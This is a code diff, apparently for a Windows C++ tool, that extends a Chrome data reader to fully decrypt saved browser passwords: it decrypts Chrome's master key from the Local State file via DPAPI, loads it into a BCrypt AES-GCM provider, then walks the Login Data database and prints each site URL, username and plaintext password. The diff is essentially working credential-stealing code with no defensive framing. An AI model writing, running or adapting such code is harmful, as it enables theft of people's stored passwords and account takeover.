@@ -7,7 +7,8 @@
 #include <windows.h>
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
-//#include <wil/resource.h>
+#include <bcrypt.h>
+#include <wil/resource.h>
 
 namespace {
 void hexdump(const uint8_t *addr, size_t len, const char *desc = NULL);
@@ -17,6 +18,14 @@ void hexdump(const uint8_t *addr, size_t len, const char *desc = NULL);
 //using unique_sqlite_stmt = wil::unique_struct<sqlite3_stmt, decltype(&sqlite3_finalize), sqlite3_finalize>;
 
 int main() {
+    wil::unique_bcrypt_algorithm bc_alg;
+    if (STATUS_SUCCESS != BCryptOpenAlgorithmProvider(&bc_alg, BCRYPT_AES_ALGORITHM, NULL, 0)) {
+        std::wcerr << L"error opening a bcrypt algorithm provider\n";
+        return 1;
+    }
+
+    BCryptSetProperty(bc_alg.get(), BCRYPT_CHAINING_MODE, (BYTE *)BCRYPT_CHAIN_MODE_GCM, sizeof (BCRYPT_CHAIN_MODE_GCM), 0);
+
     std::wcout << "key path: "     << chrome::key_path << "\n"
                << "logins path: "  << chrome::logins_path << "\n"
                << "cookies path: " << chrome::cookies_path << "\n";
@@ -24,21 +33,27 @@ int main() {
     std::ifstream key_file(chrome::key_path);
 
     using json = nlohmann::json;
-    std::vector<uint8_t> key;
+    std::vector<uint8_t> key_data;
     try {
         json j = json::parse(key_file);
         std::string key_string = j["os_crypt"]["encrypted_key"];
         std::cout << "raw key: " << key_string << "\n";
-        key = base64_decode(&key_string[0]);
+        key_data = base64_decode(&key_string[0]);
     } catch (json::exception &) {
         std::wcerr << L"error reading json\n";
         return 1;
     }
-    hexdump(&key[0], key.size(), "base64 decoded key");
+    hexdump(&key_data[0], key_data.size(), "base64 decoded key");
 
-    key.erase(key.begin(), key.begin() + 5); // TODO vector isn't a good container for this operation
-    key = dpapi_decrypt(key);
-    hexdump(&key[0], key.size(), "DPAPI decrypted key");
+    key_data.erase(key_data.begin(), key_data.begin() + 5); // TODO vector isn't a good container for this operation
+    key_data = dpapi_decrypt(key_data);
+    hexdump(&key_data[0], key_data.size(), "DPAPI decrypted key");
+
+    wil::unique_bcrypt_key bc_key = bcrypt_import_key_blob(bc_alg, key_data);
+    if (!bc_key) {
+        std::wcerr << L"error importing key\n";
+        return 1;
+    }
 
     sqlite3 *db;
     if (sqlite3_open(narrow(chrome::logins_path).c_str(), &db) != SQLITE_OK) {
@@ -56,9 +71,50 @@ int main() {
 
     int sql_ret = 0;
     while ((sql_ret = sqlite3_step(statement)) == SQLITE_ROW) {
+        const uint8_t *pw_col = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(statement, 2));
+        const size_t pw_col_size = sqlite3_column_bytes(statement, 2);
+
         std::cout << "action_url: " << sqlite3_column_text(statement, 0) << "\n";
         std::cout << "username: " << sqlite3_column_text(statement, 1) << "\n";
-        std::cout << "password size: " << sqlite3_column_bytes(statement, 2) << "\n\n";
+
+        // [0, 2]  - magic bytes
+        // [3, 14] - nonce
+        // [15, n] - ciphertext
+        std::vector<uint8_t> nonce(pw_col + 3, pw_col + 15),
+                             ciphertext(pw_col + 15, pw_col + pw_col_size);
+
+        NTSTATUS status_ret;
+        ULONG bytes_copied;
+
+        BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
+        status_ret = BCryptGetProperty(bc_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (BYTE *)&auth_tag_lengths, sizeof (auth_tag_lengths), &bytes_copied, 0);
+
+        std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
+
+        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
+        BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
+        auth_info.pbNonce = &nonce[0];
+        auth_info.cbNonce = (ULONG)nonce.size();
+        auth_info.pbTag   = &auth_tag[0];
+        auth_info.cbTag   = (ULONG)auth_tag.size();
+
+        std::vector<uint8_t> plaintext(ciphertext.size());
+
+        status_ret = BCryptDecrypt(bc_key.get(),
+                                   &ciphertext[0],
+                                   ciphertext.size(),
+                                   &auth_info,
+                                   NULL, 0,
+                                   &plaintext[0], plaintext.size(),
+                                   &bytes_copied,
+                                   0);
+
+        plaintext.resize(plaintext.size() - 16); // TODO
+        std::cout << "plaintext password: ";
+        for (char c : plaintext) {
+            std::cout << c;
+        }
+        std::cout << "\n\n";
     }
     if (sql_ret != SQLITE_DONE) {
         std::wcerr << L"error performing sql query: " << widen(sqlite3_errmsg(db)) << L"\n";
